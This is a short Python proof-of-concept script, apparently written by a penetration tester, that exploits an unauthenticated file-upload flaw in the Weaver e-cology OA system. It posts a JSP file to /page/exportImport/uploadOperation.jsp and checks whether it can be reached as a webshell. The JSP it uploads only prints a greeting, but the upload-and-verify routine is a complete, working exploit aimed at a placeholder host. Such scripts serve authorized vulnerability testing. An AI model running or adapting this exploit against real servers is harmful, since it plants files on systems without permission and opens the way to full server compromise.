#! python3

"""

@FileName: e_cology_oa_file_upload.py
@Author: dylan
@software: PyCharm
@Datetime: 2021-04-11 13:34

"""

from urllib.parse import urljoin
import requests

requests.packages.urllib3.disable_warnings()


def isalive(url):
    respose = requests.get(url, timeout=30, verify=False)
    if respose.status_code == 200:
        return True
    return False


def upload(url):
    target = urljoin(url, "/page/exportImport/uploadOperation.jsp")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68",
        "Accept-Encoding": "gzip, deflate"
    }
    shell_content = '<% out.println("Hello The World");%>'

    files = [('file', ('config.jsp', shell_content, 'application/octet-stream'))]
    response = requests.post(target, files=files, headers=headers, timeout=30, verify=False)
    if response.status_code == 200 and "25" == response.headers.get("Content-Length"):
        webshell = urljoin(url, "page/exportImport/fileTransfer/config.jsp")
        response = requests.get(webshell, headers=headers, timeout=30, verify=False)
        if response.status_code == 200:
            print("[+] 文件上传成功！")
            print("[+] webshell: " + webshell)
        if response.status_code == 403:
            print("[-] 文件上传成功，但访问被拦截！")


if __name__ == '__main__':
    url = "http://x.x.x.x/"
    try:
        if isalive(url):
            print("开始验证：" + url)
            upload(url)
    except Exception as e:
        print(str(e))